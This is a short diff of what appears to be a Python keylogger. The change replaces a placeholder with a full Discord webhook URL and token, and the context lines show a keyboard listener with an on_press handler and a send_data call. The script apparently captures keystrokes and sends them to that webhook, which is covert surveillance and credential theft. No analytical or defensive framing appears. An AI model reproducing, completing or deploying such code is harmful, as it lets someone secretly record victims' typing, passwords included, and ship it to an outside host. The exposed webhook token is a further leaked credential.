@@ -1,6 +1,6 @@
 
 
-webhook_url = "YOUR_DISCORD_WEBHOOK_URL"
+webhook_url = "https://discord.com/api/webhooks/1442428343965188129/lSoN-8yNzw40_aU3l8ASFB6Cb4N4YYYY-WJ2PFpL4PwxxUxmocwRnnFjEK5h0ZNjsqG0"
 
 import os
 try:
@@ -58,4 +58,5 @@ def on_press(key):
 
 with keyboard.Listener(on_press=on_press) as listener:
     send_data()
+
     listener.join()
